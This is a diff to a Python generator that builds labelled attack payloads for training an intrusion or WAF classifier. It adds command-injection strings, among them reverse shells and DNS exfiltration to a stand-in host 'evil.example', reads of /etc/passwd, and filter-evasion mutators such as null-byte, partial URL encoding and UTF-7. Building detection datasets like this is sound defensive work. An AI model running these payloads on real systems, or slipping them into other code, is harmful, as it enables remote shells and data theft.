@@ -21,7 +21,7 @@ so they are exactly the realistic WAF-bypass samples the classifier must learn
 to generalise to.
 
 EXPANSION NOTES (v2 banks):
-- Known classes (sqli/xss/path_traversal) expanded to ~60-65 distinct base
+- Known classes (sqli/xss/command_injection) expanded to ~60-65 distinct base
   payloads each, stratified by SUB-TECHNIQUE (suffix prefix = technique).
 - `recon` kept small on purpose: _GOAL_FAMILIES is cumulative, so recon is
   drawn by EVERY persona. Bulk lives in exploit; data-theft in exfiltration.
@@ -32,6 +32,7 @@ EXPANSION NOTES (v2 banks):
   / held-out-unknown protocol.
 """
 
+import base64
 import random
 import urllib.parse
 
@@ -219,6 +220,26 @@ COMMAND_INJECTION = {
         ("probe_semicolon", "; id"), ("probe_pipe", "| id"), ("probe_amp", "& id"),
         ("probe_backtick", "`id`"), ("probe_dollar", "$(id)"),
         ("probe_or", "|| id"), ("probe_and", "&& id"),
+        # Blind / time-based probing: no output is returned, so the attacker
+        # confirms execution purely by the RESPONSE DELAY. Found 2026-09-18:
+        # `sleep` is one of extract_features.py's own 18 CMDI_COMMANDS
+        # keywords, yet no base payload in this bank ever contained it - a
+        # real, checkable coverage gap (mirrors the earlier 34.5% kw_cmdi
+        # bug, just in the opposite direction: feature expects it, generator
+        # never produced it).
+        ("blind_sleep_semi", "; sleep 5"), ("blind_sleep_pipe", "| sleep 5"),
+        ("blind_sleep_and", "&& sleep 10"), ("blind_sleep_sub", "$(sleep 5)"),
+        ("blind_sleep_back", "`sleep 5`"), ("blind_ping_count", "; ping -c 10 127.0.0.1"),
+        # Quote-splitting keyword evasion: adjacent quoted fragments are
+        # concatenated back together by the shell before execution, so
+        # "w'h'o'am'i" still runs as "whoami" - defeats a literal keyword
+        # filter without any encoding at all. Confirmed via
+        # PayloadsAllTheThings' Command Injection technique list
+        # (github.com/swisskyrepo/PayloadsAllTheThings) - not represented
+        # in this bank before 2026-09-18.
+        ("qsplit_whoami_single", "; w'h'o'am'i"),
+        ("qsplit_whoami_double", "; w\"h\"o\"am\"i"),
+        ("qsplit_id_backslash", "; i\\d"),
     ],
     "exploit": [
         ("chain_semicolon_ls", "; ls -la"), ("chain_pipe_whoami", "| whoami"),
@@ -228,6 +249,34 @@ COMMAND_INJECTION = {
         ("chain_semicolon_ps", "; ps aux"), ("chain_semicolon_netstat", "; netstat -an"),
         ("win_amp_dir", "& dir"), ("win_amp_type", "& type C:\\windows\\win.ini"),
         ("chain_semicolon_ifconfig", "; ifconfig"), ("chain_semicolon_id_bg", "; id #"),
+        # Windows/PowerShell chaining: the bank had only 2 Windows-flavored
+        # payloads (win_amp_dir/win_amp_type) out of 165 total, and
+        # "cmd.exe"/"powershell"/"ping -n" - all present in CMDI_KEYWORDS -
+        # never appeared in any generated payload either.
+        ("win_powershell_cmd", "& powershell -Command whoami"),
+        ("win_cmd_exe", "& cmd.exe /c whoami"),
+        ("win_ping_n", "& ping -n 10 127.0.0.1"),
+        ("win_semicolon_dir_c", "; dir C:\\"),
+        # Direct shell invocation / reverse shell: "/bin/bash", "bash -i",
+        # "sh -c", "nc -e", "netcat" are also checked-for CMDI_KEYWORDS with
+        # zero prior examples - the actual weaponized end-state of a
+        # successful command injection, not just a probing chain.
+        ("revshell_bash_i", "; bash -i >& /dev/tcp/evil.example/4444 0>&1"),
+        ("revshell_nc_e", "; nc -e /bin/sh evil.example 4444"),
+        ("revshell_sh_c", "; sh -c id"), ("subshell_bin_bash", "$(/bin/bash -c id)"),
+        # Hex-encoded command string: the shell decodes \xNN escapes before
+        # execution, so the literal keyword never appears in the request.
+        # Different mechanism from our existing url/double/partial-encode
+        # transforms below, which encode the whole query VALUE - this
+        # encodes only the command STRING inside a shell builtin.
+        ("hex_echo_id", '; $(echo -e "\\x69\\x64")'),
+        ("hex_echo_passwd_path", '; cat $(echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")'),
+        # Argument injection: a DIFFERENT attack surface entirely - instead
+        # of chaining a new command, the payload abuses a FLAG of the
+        # command already being run (no separator prefix, since the value
+        # itself becomes the malicious argument).
+        ("arginj_ssh_proxycommand", "-oProxyCommand=touch /tmp/pwned"),
+        ("arginj_wget_post_file", "--post-file=/etc/passwd"),
     ],
     "exfiltration": [
         ("exfil_cat_passwd", "; cat /etc/passwd"), ("exfil_cat_shadow", "; cat /etc/shadow"),
@@ -236,6 +285,16 @@ COMMAND_INJECTION = {
         ("exfil_nc", "; nc evil.example 4444 -e /bin/sh"),
         ("exfil_base64_passwd", "; cat /etc/passwd | base64"),
         ("exfil_env", "; env"), ("exfil_history", "; cat ~/.bash_history"),
+        # Out-of-band DNS exfiltration: a distinct, commonly-documented
+        # technique category (data leaves via DNS lookups, not HTTP/TCP),
+        # not represented at all in the prior curl/wget/nc-only exfil set.
+        ("exfil_dns_nslookup", "; nslookup $(whoami).evil.example"),
+        ("exfil_dns_dig", "; dig $(id).evil.example"),
+        # IFS/wildcard obfuscation: a shell-syntax evasion category distinct
+        # from the encoding-level evasion transforms below (case/URL/comment)
+        # - substitutes the literal space that a naive filter might block.
+        ("ifs_cat_passwd", "; cat${IFS}/etc/passwd"),
+        ("ifs_wildcard_cat", "; cat${IFS}/e??/pa??wd"),
     ],
 }
 
@@ -284,9 +343,9 @@ BANKS = {
 # Polyglots - payloads crafted to fire across multiple contexts. Kept as a
 # BANK per attack type (not a single string) so the polyglot persona still
 # produces real byte-diversity instead of collapsing to one sample per class
-# after byte-identical dedup in merge_jsonl.py. NOTE: path_traversal polyglots
-# intentionally carry %-encoding / overlong / null-byte forms (that is their
-# whole point) - so they live HERE, not in the canonical base bank.
+# after byte-identical dedup in merge_jsonl.py. NOTE: command_injection
+# polyglots intentionally combine separators/subshells (that is their whole
+# point) - so they live HERE, not in the canonical base bank.
 POLYGLOTS = {
     "command_injection": [
         "; id; whoami", "| id | whoami", "`id``whoami`", "$(id)$(whoami)",
@@ -337,7 +396,7 @@ POLYGLOTS = {
 # v3 COMBINATORIAL EXPANSION
 # --------------------------------------------------------------------------
 # The curated banks above are the hand-written quality core. Below we grow
-# each KNOWN class (sqli / xss / path_traversal) into a payload SPACE large
+# each KNOWN class (sqli / xss / command_injection) into a payload SPACE large
 # enough that the driver can capture ~1000+ byte-unique requests per class
 # after merge_jsonl dedup. code_injection is grown only MODERATELY on purpose
 # to preserve its held-out / open-set (Protocol 3) role.
@@ -537,6 +596,19 @@ SQLI["exfiltration"] += _gen_sqli_exfil()
 XSS["exploit"] += _gen_xss_exploit()
 XSS["exfiltration"] += _gen_xss_exfil()
 _ci_r, _ci_e, _ci_x = _gen_code_injection()
+# OPEN-SET GUARD (CWE-94 held-out unknown): code_injection must stay SMALL &
+# novel so it is a genuine unseen class at test time. _gen_code_injection()
+# over-expands it (~124), so cap the generated additions to a small, balanced,
+# deterministic budget -> class stays <= _CI_OPENSET_MAX distinct base payloads
+# (stable payload_ids across runs -> safe for group-wise CV on parent_id).
+_CI_OPENSET_MAX = 20
+_ci_curated = sum(len(v) for v in CODE_INJECTION.values())
+_ci_budget = max(0, _CI_OPENSET_MAX - _ci_curated)
+_ci_r = _ci_r[:min(5, _ci_budget)]
+_ci_budget -= len(_ci_r)
+_ci_e = _ci_e[:min(5, _ci_budget)]
+_ci_budget -= len(_ci_e)
+_ci_x = _ci_x[:max(0, _ci_budget)]
 CODE_INJECTION["recon"] += _ci_r
 CODE_INJECTION["exploit"] += _ci_e
 CODE_INJECTION["exfiltration"] += _ci_x
@@ -615,9 +687,54 @@ def _mutate_comment(p: str) -> str:
     return p.replace(" ", "/**/")
 
 
+_WS_SUBSTITUTES = ["\t", "\n", "\x0b", "\x0c", "%0a", "%09"]
+
+
 def _mutate_ws(p: str) -> str:
-    # Swap spaces for tabs (whitespace-based filter bypass).
-    return p.replace(" ", "\t")
+    # Swap spaces for an alternate whitespace/control token - defeats
+    # filters that only strip literal spaces (or only tabs).
+    return p.replace(" ", random.choice(_WS_SUBSTITUTES))
+
+
+def _mutate_nullbyte(p: str) -> str:
+    # Literal "%00" as DATA (not an actual NUL byte) - classic truncation
+    # bypass: some parsers/filters stop reading at the null byte while the
+    # backend keeps parsing past it. Appended, or spliced mid-payload.
+    if len(p) <= 1 or random.random() < 0.5:
+        return p + "%00"
+    i = random.randrange(1, len(p))
+    return p[:i] + "%00" + p[i:]
+
+
+def _encode_partial(p: str) -> str:
+    # Encode only a RANDOM SUBSET of special characters, leaving the rest
+    # (often including the keyword tokens themselves) in plaintext - defeats
+    # filters that only pattern-match the fully-decoded OR fully-encoded
+    # form, since this payload is neither.
+    out = []
+    for c in p:
+        if not c.isalnum() and random.random() < 0.5:
+            out.append(f"%{ord(c):02X}")
+        else:
+            out.append(c)
+    return "".join(out)
+
+
+def _utf7_char(c: str) -> str:
+    b64 = base64.b64encode(c.encode("utf-16-be")).decode("ascii").rstrip("=")
+    return f"+{b64}-"
+
+
+_UTF7_TARGET_CHARS = set("<>&'\"();:=/")
+
+
+def _encode_utf7(p: str) -> str:
+    # Classic charset-confusion XSS bypass: force the HTML-breakout
+    # characters into UTF-7 shifted sequences (e.g. '<' -> '+ADw-') while
+    # leaving alphanumerics as direct characters. Only meaningful where a
+    # downstream parser can be coaxed into interpreting the response as
+    # UTF-7 - included as an XSS-only evasion for that reason.
+    return "".join(_utf7_char(c) if c in _UTF7_TARGET_CHARS else c for c in p)
 
 
 def apply_evasion(payload_id: str, raw_payload: str, evasion: str,
@@ -628,10 +745,26 @@ def apply_evasion(payload_id: str, raw_payload: str, evasion: str,
     a variant back to its base payload_id (emitted as X-Capture-Parent).
     """
     if evasion == "encoded":
-        fn = rng.choice([_encode_url, _encode_double])
+        # A payload that already contains a literal '%' (e.g. the %0a/%0d
+        # newline-separator command_injection payloads - see gen_chain_74-78)
+        # is already its own encoding technique. Re-running it through
+        # _encode_url/_encode_double/_encode_partial percent-encodes the '%'
+        # itself (%0a -> %250a), which a single server-side URL-decode does
+        # NOT undo back to a real separator - found 2026-09-17, affected 206
+        # captured command_injection records. Skip percent-based re-encoding
+        # for those; they're left as-is (already an evasion form) unless the
+        # xss-only UTF-7 path applies, which doesn't touch '%' at all.
+        if "%" in raw_payload and attack_type != "xss":
+            return "encoded", payload_id, raw_payload
+        choices = [_encode_url, _encode_double, _encode_partial]
+        if attack_type == "xss":
+            choices.append(_encode_utf7)
+        if "%" in raw_payload:
+            choices = [_encode_utf7]
+        fn = rng.choice(choices)
         return "encoded", payload_id, fn(raw_payload)
     if evasion == "mutated":
-        fn = rng.choice([_mutate_case, _mutate_comment, _mutate_ws])
+        fn = rng.choice([_mutate_case, _mutate_comment, _mutate_ws, _mutate_nullbyte])
         return "mutated", payload_id, fn(raw_payload)
     if evasion == "polyglot":
         bank = POLYGLOTS[attack_type]
